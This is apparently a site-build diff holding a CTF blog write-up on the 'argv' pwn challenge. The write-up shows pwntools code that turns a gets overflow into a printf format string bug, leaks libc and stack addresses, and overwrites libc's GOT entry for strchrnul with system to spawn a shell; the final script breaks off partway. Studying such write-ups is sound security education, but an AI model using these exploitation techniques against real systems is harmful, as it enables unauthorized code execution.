+                d="M416 208c0 45.9-14.9 88.3-40 122.7L502.6 457.4c12.5 12.5 12.5 32.8 0 45.3s-32.8 12.5-45.3 0L330.7 376c-34.4 25.2-76.8 40-122.7 40C93.1 416 0 322.9 0 208S93.1 0 208 0S416 93.1 416 208zM208 352a144 144 0 1 0 0-288 144 144 0 1 0 0 288z" />
+            </svg>
+            <svg
+              xmlns="http://www.w3.org/2000/svg"
+              viewBox="0 0 512 512"
+              height="18"
+              width="18"
+              class="search-reset"
+              data-type="reset">
+              <path
+                fill="currentColor"
+                d="M256 512A256 256 0 1 0 256 0a256 256 0 1 0 0 512zM175 175c9.4-9.4 24.6-9.4 33.9 0l47 47 47-47c9.4-9.4 24.6-9.4 33.9 0s9.4 24.6 0 33.9l-47 47 47 47c9.4 9.4 9.4 24.6 0 33.9s-24.6 9.4-33.9 0l-47-47-47 47c-9.4 9.4-24.6 9.4-33.9 0s-9.4-24.6 0-33.9l47-47-47-47c-9.4-9.4-9.4-24.6 0-33.9z" />
+            </svg>
+          </label>
+          <input
+            id="search-modal-input"
+            type="text"
+            data-search-input
+            autocomplete="off"
+            aria-label="Search"
+            placeholder="Search Post..." />
+        </div>
+        <div class="search-wrapper-body">
+          <div class="search-result" data-search-result></div>
+          <span class="search-result-empty">
+            Type something to search..
+          </span>
+        </div>
+        <div class="search-wrapper-footer">
+          <span>
+            <kbd>
+              <svg
+                xmlns="http://www.w3.org/2000/svg"
+                width="14"
+                height="14"
+                fill="currentColor"
+                viewBox="0 0 16 16">
+                <path
+                  d="M3.204 11h9.592L8 5.519 3.204 11zm-.753-.659 4.796-5.48a1 1 0 0 1 1.506 0l4.796 5.48c.566.647.106 1.659-.753 1.659H3.204a1 1 0 0 1-.753-1.659z" />
+              </svg>
+            </kbd>
+            <kbd>
+              <svg
+                xmlns="http://www.w3.org/2000/svg"
+                width="14"
+                height="14"
+                fill="currentColor"
+                style="margin-top:1px;"
+                viewBox="0 0 16 16">
+                <path
+                  d="M3.204 5h9.592L8 10.481 3.204 5zm-.753.659 4.796 5.48a1 1 0 0 0 1.506 0l4.796-5.48c.566-.647.106-1.659-.753-1.659H3.204a1 1 0 0 0-.753 1.659z" />
+              </svg>
+            </kbd>
+            to navigate
+          </span>
+          <span>
+            <kbd>
+              <svg
+                xmlns="http://www.w3.org/2000/svg"
+                width="12"
+                height="12"
+                fill="currentColor"
+                style="display:inline-block;"
+                viewBox="0 0 16 16">
+                <path
+                  fill-rule="evenodd"
+                  d="M14.5 1.5a.5.5 0 0 1 .5.5v4.8a2.5 2.5 0 0 1-2.5 2.5H2.707l3.347 3.346a.5.5 0 0 1-.708.708l-4.2-4.2a.5.5 0 0 1 0-.708l4-4a.5.5 0 1 1 .708.708L2.707 8.3H12.5A1.5 1.5 0 0 0 14 6.8V2a.5.5 0 0 1 .5-.5z" />
+              </svg>
+            </kbd>
+            to select
+          </span>
+          <span class="search-result-info"></span>
+          <span data-target="close-search-modal">
+            <kbd>ESC</kbd> to close
+          </span>
+        </div>
+      </div>
+    </div>
+  
+
+
+
+
+    <main>
+      
+  <section class="section pt-7">
+    <div class="container">
+      <div class="row justify-center">
+        <article class="lg:col-10">
+          
+          
+            <div class="mb-10">
+              
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <img
+    loading=""
+    decoding="async"
+    src="https://imgcdn.stablediffusionweb.com/2025/2/7/43af290a-fdbf-45eb-9144-731fe2ed39ad.jpg"
+    alt="ImaginaryCTF Argv Pwn Writeup"
+    class="w-full rounded img"
+    height=""
+    width="" />
+
+
+            </div>
+          
+          <h1 class="h2 mb-4">
+            ImaginaryCTF Argv Pwn Writeup
+          </h1>
+          <ul class="mb-4">
+            <li class="mr-4 inline-block">
+              <a
+                href="/authors/zerofrost/">
+                <i class="fa-regular fa-circle-user mr-2"></i
+                >zerofrost
+              </a>
+            </li>
+            
+            
+              <li class="mr-4 inline-block">
+                <i class="fa-regular fa-folder mr-2"></i>
+                
+                  <a
+                    href="/categories/pwn/"
+                    class=""
+                    >Pwn
+                  </a>
+                
+              </li>
+            
+            <li class="mr-4 inline-block">
+              <i class="fa-regular fa-clock mr-2"></i>
+              February 11, 2024
+            </li>
+          </ul>
+          <div class="content mb-10">
+            
+
+ 
+  
+
+<details open class="table-of-content blog">
+  <summary>
+    
+      Table of Contents
+    
+  </summary>
+  <nav id="TableOfContents">
+  <ol>
+    <li><a href="#introduction">Introduction</a>
+      <ol>
+        <li><a href="#binary-information">Binary Information</a></li>
+        <li><a href="#ghidra">Ghidra</a></li>
+        <li><a href="#debugging">Debugging</a></li>
+        <li><a href="#leaking-addresses">Leaking Addresses</a></li>
+        <li><a href="#buffer-overflow-to-format-string">Buffer Overflow to Format String</a></li>
+        <li><a href="#method-1-arbitrary-write-to-libc-got">Method 1: Arbitrary Write to LIBC Got</a></li>
+        <li><a href="#method-2-house-of-husk">Method 2: House of Husk</a></li>
+        <li><a href="#references">References</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+</details>
+
+            <h2 id="introduction">Introduction</h2>
+<p>This blog post is a walkthrough of an interesting pwn challenge I came across in the imaginary ctf discord challenge.</p>
+<h3 id="binary-information">Binary Information</h3>
+<p>Checking the file type of the binary, we can confirm that the file is a <code>64bit</code> executable which is dynamically linked and the libc file is provided. We can also see that the binary has <code>No Canary</code> and <code>No PIE</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.<span style="color:#56b6c2">/</span><span style="color:#e06c75">argv</span>: <span style="color:#e06c75">ELF</span> <span style="color:#d19a66">64</span><span style="color:#56b6c2">-</span><span style="color:#e06c75">bit</span> <span style="color:#e06c75">LSB</span> <span style="color:#e06c75">executable</span>, <span style="color:#e06c75">x86</span><span style="color:#56b6c2">-</span><span style="color:#d19a66">64</span>, <span style="color:#e06c75">version</span> <span style="color:#d19a66">1</span> (<span style="color:#e06c75">SYSV</span>), <span style="color:#e06c75">dynamically</span> <span style="color:#e06c75">linked</span>, <span style="color:#e06c75">interpreter</span> <span style="color:#56b6c2">/</span><span style="color:#e06c75">lib64</span><span style="color:#56b6c2">/</span><span style="color:#e06c75">ld</span><span style="color:#56b6c2">-</span><span style="color:#e06c75">linux</span><span style="color:#56b6c2">-</span><span style="color:#e06c75">x86</span><span style="color:#56b6c2">-</span><span style="color:#d19a66">64.</span><span style="color:#e06c75">so</span><span style="color:#d19a66">.2</span>, <span style="color:#e06c75">BuildID</span>[<span style="color:#e06c75">sha1</span>]<span style="color:#56b6c2">=</span><span style="color:#d19a66">1</span><span style="color:#e06c75">ec247dc11817e2e52f5e75b63701f24d11a936c</span>, <span style="color:#c678dd">for</span> <span style="color:#e06c75">GNU</span><span style="color:#56b6c2">/</span><span style="color:#e06c75">Linux</span> <span style="color:#d19a66">3.2.0</span>, <span style="color:#e06c75">not</span> <span style="color:#e06c75">stripped</span>
+</span></span></code></pre></div><p>From the checksec results:</p>
+<ul>
+<li><code>Full RELRO</code> is enabled, meaning we can&rsquo;t overwrite got entries since most sections are marked as readable and not writable.</li>
+<li><code>NX enabled</code>, also known as DEP is another exploit mitigation that enforces whether pages of memory can be treated as executable code.</li>
+<li><code>PIE</code> stands for position independent executable, this binary is not position independent, which means at runtime we&rsquo;ll know its addresses. This is just so that we have static locations which we can interact with e.g. with arbitrary writes.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>[<span style="color:#56b6c2">*</span>] <span style="color:#56b6c2">-</span>  <span style="color:#e06c75">Checking</span> <span style="color:#e06c75">binary</span> <span style="color:#e06c75">protections</span>
+</span></span><span style="display:flex;"><span>[<span style="color:#56b6c2">*</span>] &#39;<span style="color:#56b6c2">/</span><span style="color:#e06c75">imaginaryctf</span><span style="color:#56b6c2">/</span><span style="color:#e06c75">argv</span><span style="color:#56b6c2">/</span><span style="color:#e06c75">argv</span>&#39;
+</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">Arch</span>:     <span style="color:#e06c75">amd64</span><span style="color:#56b6c2">-</span><span style="color:#d19a66">64</span><span style="color:#56b6c2">-</span><span style="color:#e06c75">little</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">RELRO</span>:    <span style="color:#e06c75">Full</span> <span style="color:#e06c75">RELRO</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">Stack</span>:    <span style="color:#e06c75">No</span> <span style="color:#e06c75">canary</span> <span style="color:#e06c75">found</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">NX</span>:       <span style="color:#e06c75">NX</span> <span style="color:#e06c75">enabled</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">PIE</span>:      <span style="color:#e06c75">No</span> <span style="color:#61afef;font-weight:bold">PIE</span> (<span style="color:#d19a66">0x400000</span>)
+</span></span></code></pre></div><ul>
+<li>Checking for custom functions in the binary, we can see that the binary only has the  <code>main</code>  and has two interesting libc functions <code>gets</code> and <code>printf</code></li>
+</ul>
+<h3 id="ghidra">Ghidra</h3>
+<ul>
+<li>Opening the binary in Ghidra, we find the following code
+<img src="/images/ImaginaryCTF_-_Argv/Pasted_20241114212637.png" alt=""></li>
+</ul>
+<p>From the code above, we can see that the binary runs <code>gets</code> and <code>printf</code> infinitely due to the <code>while</code> loop and therefore <code>does not exit or return</code>. This means that there is no return address to overwrite on the stack. The program enters a while loop where it accepts user input without bounds checking via the <code>gets</code> function, then prints <code>argv[0]</code> which represents the binary filename. We can confirm this by running the binary
+<img src="/images/ImaginaryCTF_-_Argv/run_binary.png" alt=""></p>
+<h3 id="debugging">Debugging</h3>
+<p>To debug the program, I set two break points before the <code>gets</code> and <code>printf</code> functions. This will help us know the location of where our input is written on the stack, and the location of the <code>argv[0]</code> parameter also place on the stack, and if we can use our input to overwrite it.
+<img src="/images/ImaginaryCTF_-_Argv/Pasted_20241110203028.png" alt="">
+<img src="/images/ImaginaryCTF_-_Argv/Pasted_20241110203242.png" alt=""></p>
+<p>Checking the addresses passed to <code>printf</code>, we can see that the address <code>0x00007fffffffde8e</code> is passed as the first parameter.</p>
+<blockquote>
+<p>However, we can see that another address <code>0x00007fffffffdab8</code> contains a pointer pointing to the location of <code>argv[0]</code>. This address is located on the stack too(<code>0x00007fffffffd940</code>).</p></blockquote>
+<p><img src="/images/ImaginaryCTF_-_Argv/Pasted_20241110204119.png" alt=""></p>
+<p>Taking a look of addresses on the stack starting from where the buffer starts, we can see the address to the filename at <code>0x7fffffffdab8</code>, What happens when we overwrite this address with a pointer to any string e.g. the start of our buffer? Let&rsquo;s try it out
+<img src="/images/ImaginaryCTF_-_Argv/Pasted_20241110204624.png" alt=""></p>
+<p>We can create a payload in python as follows</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e06c75">payload</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;A&#39;</span> <span style="color:#56b6c2">*</span> <span style="color:#d19a66">360</span> <span style="color:#56b6c2">+</span> <span style="color:#e06c75">p64</span>(<span style="color:#d19a66">0x7fffffffd950</span>) 
 </span></span></code></pre></div><p>But since we are already in GDB, we can use the <code>set</code> command to overwrite the address. We can first delete the breakpoints, then overwrite the address and continue execution as follows
-<img src=/images/ImaginaryCTF_-_Argv/Pasted_20241110205411.png alt></p><p>From the above screenshot, we can see that our input was printed on the screen!! We can use this as a way to:</p><ul><li>Leak addresses in the GOT e.g. <code>elf.got.gets</code> (overwrite the argv string pointer with elf.got.gets)</li><li>Convert it to a format string vulnerability turning it into an arbitrary write primitive, after all it uses <code>printf</code> on attacker-controlled input. (ovewrite the argv string pointer with the stack address of where the buffer starts)</li></ul><p>With a confirmed format string vulnerability, we can find the injection point as follows
-<img src=/images/ImaginaryCTF_-_Argv/Pasted_20241110210120.png alt>
-From the above results, the injection point is at <code>8</code></p><h3 id=leaking-addresses>Leaking Addresses</h3><p>With the format string vulnerability, we can:</p><ul><li>Print the got addresses of functions like <code>gets</code> and <code>printf</code></li><li>Calculate the libc base address</li><li>Calculate the address of functions and strings we may need later, e.g. <code>system</code> and <code>/bin/sh</code></li><li>We also need to find a way to leak stack addresses, for this we may also need the address of <code>libc.sym.environ</code></li></ul><blockquote><p>There is a symbol <code>environ</code> in libc, whose value is the same as the third argument of <code>main</code> function, <code>char **envp</code>.</p></blockquote><p>Printing the got address of <code>gets</code> is as easy as follows</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>f</span><span style=color:#98c379>&#34;[*] Stage 1: Leak libc addresses&#34;</span>)
-</span></span><span style=display:flex><span><span style=color:#e06c75>payload</span><span style=color:#56b6c2>=</span><span style=color:#98c379>b</span><span style=color:#98c379>&#34;A&#34;</span> <span style=color:#56b6c2>*</span> (<span style=color:#d19a66>360</span>) <span style=color:#56b6c2>+</span> <span style=color:#e06c75>p64</span>(<span style=color:#e06c75>elf</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>got</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>gets</span>)
-</span></span><span style=display:flex><span><span style=color:#e06c75>target</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>sendline</span>(<span style=color:#e06c75>payload</span>)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#7f848e># Parse the leaked address and calculate libc addresses</span>
-</span></span><span style=display:flex><span><span style=color:#e06c75>gets_leak</span><span style=color:#56b6c2>=</span><span style=color:#e5c07b>int</span>((<span style=color:#e06c75>u64</span>(<span style=color:#e06c75>target</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>recv</span>(<span style=color:#d19a66>0x8</span>)<span style=color:#56b6c2>.</span><span style=color:#e06c75>ljust</span>(<span style=color:#d19a66>8</span>,<span style=color:#98c379>b</span><span style=color:#98c379>&#34;</span><span style=color:#98c379>\x00</span><span style=color:#98c379>&#34;</span>)))) 
-</span></span><span style=display:flex><span><span style=color:#e06c75>libc</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>address</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>gets_leak</span> <span style=color:#56b6c2>-</span> <span style=color:#e06c75>libc</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>sym</span>[<span style=color:#98c379>&#39;gets&#39;</span>]
-</span></span><span style=display:flex><span><span style=color:#e06c75>system</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>libc</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>symbols</span>[<span style=color:#98c379>&#39;system&#39;</span>]
-</span></span><span style=display:flex><span><span style=color:#e06c75>puts</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>libc</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>symbols</span>[<span style=color:#98c379>&#39;puts&#39;</span>]
-</span></span><span style=display:flex><span><span style=color:#e06c75>exit_fn</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>libc</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>symbols</span>[<span style=color:#98c379>&#39;exit&#39;</span>]
-</span></span><span style=display:flex><span><span style=color:#e06c75>binsh</span><span style=color:#56b6c2>=</span><span style=color:#e5c07b>next</span>(<span style=color:#e06c75>libc</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>search</span>(<span style=color:#98c379>b</span><span style=color:#98c379>&#39;/bin/sh</span><span style=color:#98c379>\x00</span><span style=color:#98c379>&#39;</span>))
-</span></span><span style=display:flex><span><span style=color:#e06c75>environ</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>libc</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>sym</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>environ</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] Leaked gets got address: &#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>str</span>(<span style=color:#e5c07b>hex</span>(<span style=color:#e06c75>gets_leak</span>)))
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] Libc_addr base address at : &#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>str</span>(<span style=color:#e5c07b>hex</span>(<span style=color:#e06c75>libc</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>address</span>)))
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] Found system at : &#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>str</span>(<span style=color:#e5c07b>hex</span>(<span style=color:#e06c75>system</span>)))
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] Found puts at : &#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>str</span>(<span style=color:#e5c07b>hex</span>(<span style=color:#e06c75>puts</span>)))
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] Found exit_fn at : &#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>str</span>(<span style=color:#e5c07b>hex</span>(<span style=color:#e06c75>exit_fn</span>)))
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] Found shell at : &#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>str</span>(<span style=color:#e5c07b>hex</span>(<span style=color:#e06c75>binsh</span>)))
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] Found environ at : &#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>str</span>(<span style=color:#e5c07b>hex</span>(<span style=color:#e06c75>environ</span>)))
-</span></span></code></pre></div><p><img src=/images/ImaginaryCTF_-_Argv/Pasted_20241110211150.png alt></p><p>We can leak a stack address just like we leaked the <code>gets</code> got address, this time using the <code>environ</code> address, and we will receive a stack address. Using this address, we will be able to calculate where our buffer starts in the stack etc.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#56b6c2>.....</span><span style=color:#e06c75>SNIP</span><span style=color:#56b6c2>.......</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>f</span><span style=color:#98c379>&#34;</span><span style=color:#98c379>\n</span><span style=color:#98c379>[*] Stage 2: Leak stack addresses&#34;</span>)
-</span></span><span style=display:flex><span><span style=color:#e06c75>payload</span><span style=color:#56b6c2>=</span><span style=color:#98c379>b</span><span style=color:#98c379>&#34;A&#34;</span> <span style=color:#56b6c2>*</span> (<span style=color:#d19a66>360</span>) <span style=color:#56b6c2>+</span> <span style=color:#e06c75>p64</span>(<span style=color:#e06c75>environ</span>)
-</span></span><span style=display:flex><span><span style=color:#e06c75>target</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>sendline</span>(<span style=color:#e06c75>payload</span>)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#e06c75>stack_leak</span><span style=color:#56b6c2>=</span><span style=color:#e5c07b>int</span>((<span style=color:#e06c75>u64</span>(<span style=color:#e06c75>target</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>recv</span>(<span style=color:#d19a66>0x8</span>)<span style=color:#56b6c2>.</span><span style=color:#e06c75>ljust</span>(<span style=color:#d19a66>8</span>,<span style=color:#98c379>b</span><span style=color:#98c379>&#34;</span><span style=color:#98c379>\x00</span><span style=color:#98c379>&#34;</span>))))
-</span></span><span style=display:flex><span><span style=color:#e06c75>buffer_start</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>stack_leak</span> <span style=color:#56b6c2>-</span> <span style=color:#d19a66>0x178</span> <span style=color:#7f848e># Distance from the leaked addr to the start of our buffer</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] Leaked stack address : &#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>str</span>(<span style=color:#e5c07b>hex</span>(<span style=color:#e06c75>stack_leak</span>)))
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] Buffer starts at : &#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>str</span>(<span style=color:#e5c07b>hex</span>(<span style=color:#e06c75>buffer_start</span>)))
-</span></span></code></pre></div><p><img src=/images/ImaginaryCTF_-_Argv/Pasted_20241110213155.png alt></p><h3 id=buffer-overflow-to-format-string>Buffer Overflow to Format String</h3><p>Just like before in the debugging process, we can now convert our buffer overflow to a format string vulnerability by overwriting the <code>argv[0]</code> with the address of where our buffer starts. This time I used <code>NULL</code> values instead of <code>A's</code> for better visibility on what is written on the stack</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#56b6c2>.....</span><span style=color:#e06c75>SNIP</span><span style=color:#56b6c2>.....</span>
-</span></span><span style=display:flex><span><span style=color:#e06c75>payload</span><span style=color:#56b6c2>=</span><span style=color:#98c379>b</span><span style=color:#98c379>&#34;</span><span style=color:#98c379>\x00</span><span style=color:#98c379>&#34;</span> <span style=color:#56b6c2>*</span> (<span style=color:#d19a66>360</span>) <span style=color:#56b6c2>+</span> <span style=color:#e06c75>p64</span>(<span style=color:#e06c75>buffer_start</span>)
-</span></span><span style=display:flex><span><span style=color:#e06c75>target</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>sendline</span>(<span style=color:#e06c75>payload</span>)
-</span></span></code></pre></div><p><img src=/images/ImaginaryCTF_-_Argv/Pasted_20241110213601.png alt>
-Initially, we get the address we sent in our payload as the output, but later, our input starts being passed to <code>printf</code>, we can verify by sending format string payloads which then leak values on the stack. Now that we have this format string vulnerability, we can convert it into an arbitrary write.</p><h3 id=method-1-arbitrary-write-to-libc-got>Method 1: Arbitrary Write to LIBC Got</h3><blockquote><p>This was the method I used to solve this challenge, however, it was not the intended solution</p></blockquote><p>Since the binary is compiled with <code>FULL RERLO</code>, we cannot overwrite GOT entries in the binary, however, we can overwrite LIBC Got entries since the last region of libc is marked as writable. Looking at the addresses in the region, we see two interesting address <code>0x00007ffff7f157e0</code> and <code>0x00007ffff7f15400</code> pointing to <code>strlen</code> and <code>strchrnul</code> respectively.</p><p><img src=/images/ImaginaryCTF_-_Argv/Pasted_20241110214053.png alt></p><p>Mostly, I try to overwrite the <code>strlen</code> address with the address of let&rsquo;s say <code>system</code> since <code>strlen</code> is called in functions such as <code>puts</code> and <code>printf(sometimes)</code>. Moreover, it is similar to <code>system</code> in that they both take a pointer to a string as their first parameter e.g <code>/bin/sh</code>. Using our arbitrary write, let&rsquo;s overwrite it with a custom value e.g <code>0xdeadbeef</code> for testing</p><p><img src=/images/ImaginaryCTF_-_Argv/Pasted_20241110214633.png alt></p><p>After overwriting the address with <code>0xdeadbeef</code> and proceeding with execution, entering any input does not trigger our redirection to <code>0xdeadbeef</code> meaning <code>strlen</code> is not called, despite printing values with <code>printf</code>. This is because <code>strlen</code> is only called when <code>printf</code> is called with the <code>%s</code> format string. So to trigger <code>strlen</code>, we can enter <code>%s</code> as our input.</p><p><img src=/images/ImaginaryCTF_-_Argv/Pasted_20241110215021.png alt></p><p>From the above image, we can see our last input which triggered <code>strlen</code> i.e. <code>%s</code>, and we can also confirm that we were redirected to <code>0xdeadbeef</code>. With this, we can swap <code>0xdeadbeef</code> with a one-gadget address and get a shell. But it was not that easy this time due to the strict constraints
-<img src=/images/ImaginaryCTF_-_Argv/Pasted_20241110215248.png alt></p><p>Also, we cannot call <code>system</code> because the value of <code>rdi</code> is <code>0x1</code> instead of being an address pointing to a string, hmm , weird.
-<img src=/images/ImaginaryCTF_-_Argv/Pasted_20241110215429.png alt></p><p>We can retry using the other address we found (<code>strchrnul</code>). Looking at the man pages, we can see that it takes a pointer to a string as its first parameter. Let&rsquo;s overwrite it with <code>0xdeadbeef</code> and see what happens
-<img src=/images/ImaginaryCTF_-_Argv/Pasted_20241110215743.png alt></p><p><img src=/images/ImaginaryCTF_-_Argv/Pasted_20241110215943.png alt></p><p>Continuing with execution and entering a string <code>test</code>, we are redirected to <code>0xdeadbeef</code>, and not only that, our <code>rdi</code> parameter is now set to the last string we entered as input, nice!!!
-<img src=/images/ImaginaryCTF_-_Argv/Pasted_20241110220130.png alt></p><p>Now all we need is to update our script to replace the got address of <code>strchrnul</code> with <code>system</code> and then send the string <code>/bin/sh</code>. Below is the final exploit to trigger the shell</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#7f848e>#!/usr/bin/env python</span>
-</span></span><span style=display:flex><span><span style=color:#7f848e># -*- coding: utf-8 -*-</span>
-</span></span><span style=display:flex><span><span style=color:#c678dd>from</span> <span style=color:#e06c75>pwn</span> <span style=color:#c678dd>import</span> <span style=color:#56b6c2>*</span>
-</span></span><span style=display:flex><span><span style=color:#e06c75>context</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>update</span>(<span style=color:#e06c75>arch</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;amd64&#34;</span>,<span style=color:#e06c75>os</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;linux&#34;</span>)
-</span></span><span style=display:flex><span><span style=color:#e06c75>filename</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>&#39;./argv&#39;</span>
-</span></span><span style=display:flex><span><span style=color:#e06c75>libc</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>ELF</span>(<span style=color:#98c379>&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span>,<span style=color:#e06c75>checksec</span><span style=color:#56b6c2>=</span><span style=color:#e5c07b>False</span>)
-</span></span><span style=display:flex><span><span style=color:#e06c75>e</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>elf</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>ELF</span>(<span style=color:#e06c75>filename</span>)
-</span></span><span style=display:flex><span><span style=color:#e06c75>target</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>process</span>(<span style=color:#e06c75>filename</span>)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#c678dd>def</span> <span style=color:#61afef;font-weight:700>write_64</span>(<span style=color:#e06c75>write_location</span>,<span style=color:#e06c75>write_value</span>):
-</span></span><span style=display:flex><span>	<span style=color:#e06c75>payload</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>fmtstr_payload</span>(<span style=color:#d19a66>8</span>,{ <span style=color:#7f848e># injection == 8</span>
-</span></span><span style=display:flex><span>		<span style=color:#e06c75>write_location</span>:<span style=color:#e06c75>write_value</span>
-</span></span><span style=display:flex><span>	})
-</span></span><span style=display:flex><span>	<span style=color:#e06c75>target</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>sendline</span>(<span style=color:#e06c75>payload</span>)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>f</span><span style=color:#98c379>&#34;</span><span style=color:#98c379>\n</span><span style=color:#98c379>[*] Stage 1: Leak libc addresses&#34;</span>)
-</span></span><span style=display:flex><span><span style=color:#e06c75>payload</span><span style=color:#56b6c2>=</span><span style=color:#98c379>b</span><span style=color:#98c379>&#34;A&#34;</span> <span style=color:#56b6c2>*</span> (<span style=color:#d19a66>360</span>) <span style=color:#56b6c2>+</span> <span style=color:#e06c75>p64</span>(<span style=color:#e06c75>elf</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>got</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>gets</span>)
-</span></span><span style=display:flex><span><span style=color:#e06c75>target</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>sendline</span>(<span style=color:#e06c75>payload</span>)
-</span></span><span style=display:flex><span><span style=color:#e06c75>gets_leak</span><span style=color:#56b6c2>=</span><span style=color:#e5c07b>int</span>((<span style=color:#e06c75>u64</span>(<span style=color:#e06c75>target</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>recv</span>(<span style=color:#d19a66>0x8</span>)<span style=color:#56b6c2>.</span><span style=color:#e06c75>ljust</span>(<span style=color:#d19a66>8</span>,<span style=color:#98c379>b</span><span style=color:#98c379>&#34;</span><span style=color:#98c379>\x00</span><span style=color:#98c379>&#34;</span>)))) 
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#e06c75>libc</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>address</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>gets_leak</span> <span style=color:#56b6c2>-</span> <span style=color:#e06c75>libc</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>sym</span>[<span style=color:#98c379>&#39;gets&#39;</span>]
